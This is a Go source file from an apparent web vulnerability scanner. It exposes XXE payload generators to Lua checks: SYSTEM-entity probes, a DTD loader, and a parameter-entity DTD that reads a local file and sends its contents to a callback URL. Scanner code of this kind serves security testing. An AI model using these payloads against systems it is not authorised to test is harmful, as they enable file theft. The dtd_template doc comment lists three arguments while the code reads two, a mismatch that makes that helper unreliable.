package luabridge

import (
	lua "github.com/yuin/gopher-lua"

	"github.com/londonmax12/hyperz/internal/checks"
)

// buildXXETable returns the ctx.xxe helper namespace. The surface
// exposes the canned XML payload catalogue + helpers the .lua xxe
// port consumes; finding-shape composition lives in xxe.lua.
//
// Entry points:
//
//	ctx.xxe.file_disclose_docs() -> array of strings
//	ctx.xxe.error_docs()         -> array of strings
//	ctx.xxe.baseline_doc()       -> string (benign XML the .lua
//	  baseline-probe sends to each candidate before the payload arm)
//	ctx.xxe.extract_system_target(doc) -> string (file:// URL the doc
//	  asks the parser to dereference; falls back to "external entity")
//	ctx.xxe.extract_exfil_data(raw_path) -> string (URL-decoded `d=`
//	  query value the parameter-entity exfil callback carries)
//	ctx.xxe.oob_exfil_probe_file() -> string ("file:///etc/hostname")
//	ctx.xxe.dtd_template(dtd_url, exfil_url, probe_file) -> string
//	  (the canonical parameter-entity DTD body the OOB listener serves)
//	ctx.xxe.system_oob_doc(canary_url) -> string (XML document that
//	  declares a SYSTEM entity pointing at canary_url - the basic OOB
//	  probe shape)
//	ctx.xxe.dtd_loader_doc(dtd_url) -> string (XML document that
//	  references the planted DTD via the DOCTYPE SYSTEM identifier)
func buildXXETable(L *lua.LState) *lua.LTable {
	t := L.NewTable()
	t.RawSetString("file_disclose_docs", L.NewFunction(xxeFileDiscloseDocs))
	t.RawSetString("error_docs", L.NewFunction(xxeErrorDocs))
	t.RawSetString("baseline_doc", L.NewFunction(xxeBaselineDoc))
	t.RawSetString("extract_system_target", L.NewFunction(xxeExtractSystemTarget))
	t.RawSetString("extract_exfil_data", L.NewFunction(xxeExtractExfilData))
	t.RawSetString("oob_exfil_probe_file", L.NewFunction(xxeOOBExfilProbeFile))
	t.RawSetString("dtd_template", L.NewFunction(xxeDTDTemplate))
	t.RawSetString("system_oob_doc", L.NewFunction(xxeSystemOOBDoc))
	t.RawSetString("dtd_loader_doc", L.NewFunction(xxeDTDLoaderDoc))
	return t
}

func xxeFileDiscloseDocs(L *lua.LState) int {
	out := L.NewTable()
	for i, d := range checks.XXEFileDiscloseDocsLua() {
		out.RawSetInt(i+1, lua.LString(d))
	}
	L.Push(out)
	return 1
}

func xxeErrorDocs(L *lua.LState) int {
	out := L.NewTable()
	for i, d := range checks.XXEErrorDocsLua() {
		out.RawSetInt(i+1, lua.LString(d))
	}
	L.Push(out)
	return 1
}

func xxeBaselineDoc(L *lua.LState) int {
	L.Push(lua.LString(checks.XXEBaselineDocLua()))
	return 1
}

func xxeExtractSystemTarget(L *lua.LState) int {
	L.Push(lua.LString(checks.XXEExtractSystemTargetLua(requireString(L, 1))))
	return 1
}

func xxeExtractExfilData(L *lua.LState) int {
	L.Push(lua.LString(checks.XXEExtractExfilDataLua(requireString(L, 1))))
	return 1
}

func xxeOOBExfilProbeFile(L *lua.LState) int {
	L.Push(lua.LString(checks.XXEOOBExfilProbeFileLua()))
	return 1
}

// xxeDTDTemplate returns the canonical parameter-entity exfil DTD
// body the OOB listener serves to a parser that fetches the DTD
// canary URL. dtd_url / exfil_url are the canary HTTP URLs the
// listener minted; probe_file is the file the inner SYSTEM entity
// reads. The .lua port avoids building this string in Lua because
// the literal `<!ENTITY % wrap "<!ENTITY &#x25; send SYSTEM ...">` is
// fiddly to escape correctly across Lua's quoting rules.
func xxeDTDTemplate(L *lua.LState) int {
	exfilURL := requireString(L, 1)
	probeFile := requireString(L, 2)
	out := `<!ENTITY % file SYSTEM "` + probeFile + `">` +
		`<!ENTITY % wrap "<!ENTITY &#x25; send SYSTEM '` + exfilURL + `?d=%file;'>">` +
		`%wrap;` +
		`%send;`
	L.Push(lua.LString(out))
	return 1
}

func xxeSystemOOBDoc(L *lua.LState) int {
	canaryURL := requireString(L, 1)
	out := `<?xml version="1.0" encoding="UTF-8"?>` +
		`<!DOCTYPE foo [<!ENTITY xxe SYSTEM "` + canaryURL + `">]>` +
		`<foo>&xxe;</foo>`
	L.Push(lua.LString(out))
	return 1
}

func xxeDTDLoaderDoc(L *lua.LState) int {
	dtdURL := requireString(L, 1)
	out := `<?xml version="1.0" encoding="UTF-8"?>` +
		`<!DOCTYPE foo SYSTEM "` + dtdURL + `">` +
		`<foo>x</foo>`
	L.Push(lua.LString(out))
	return 1
}
